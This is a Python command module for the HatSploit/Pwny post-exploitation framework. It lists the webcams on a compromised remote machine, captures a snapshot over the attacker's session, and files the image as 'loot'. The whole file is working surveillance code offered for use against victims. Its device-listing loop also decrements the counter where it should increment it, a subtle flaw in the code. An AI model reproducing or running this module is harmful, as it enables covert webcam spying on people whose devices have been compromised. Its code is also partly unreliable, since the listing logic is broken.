"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny.api import *
from pwny.types import *

from badges.cmd import Command

CAM_BASE = 5

CAM_FRAME = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL)
CAM_LIST = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL + 1)
CAM_START = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL + 2)
CAM_STOP = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL + 3)

CAM_ID = tlv_custom_type(TLV_TYPE_INT, CAM_BASE, API_TYPE)


class ExternalCommand(Command):
    def __init__(self):
        super().__init__({
            'Category': "gather",
            'Name': "cam",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "Use built-in camera.",
            'MinArgs': 1,
            'Options': [
                (
                    ('-l', '--list'),
                    {
                        'help': "List available camera devices.",
                        'action': 'store_true'
                    }
                ),
                (
                    ('-s', '--snap'),
                    {
                        'help': "Take a snapshot from device.",
                        'metavar': 'ID',
                        'type': int
                    }
                ),
                (
                    ('-o', '--output'),
                    {
                        'help': "Local file to save snapshot to.",
                        'metavar': 'FILE'
                    }
                )
            ]
        })

    def run(self, args):
        if args.list:
            result = self.session.send_command(
                tag=CAM_LIST
            )

            device = result.get_string(TLV_TYPE_STRING)
            id = 1

            while device:
                self.print_information(f"{str(id): <4}: {device}")
                id -= 1

                device = result.get_string(TLV_TYPE_STRING)

        elif args.snap is not None:
            result = self.session.send_command(
                tag=CAM_START,
                args={
                    CAM_ID: args.snap,
                }
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(f"Failed to open device #{str(args.snap)}!")
                return

            result = self.session.send_command(
                tag=CAM_FRAME
            )

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error(f"Failed to read device #{str(args.snap)}!")
                self.session.send_command(tag=CAM_STOP)
                return

            frame = result.get_raw(TLV_TYPE_BYTES)
            output = args.output or self.session.loot.random_loot('png')

            try:
                with open(output, 'wb') as f:
                    f.write(frame)
                self.print_success(f"Saved image to {output}!")

            except Exception:
                self.print_error(f"Failed to write image to {output}!")

            self.session.send_command(tag=CAM_STOP)
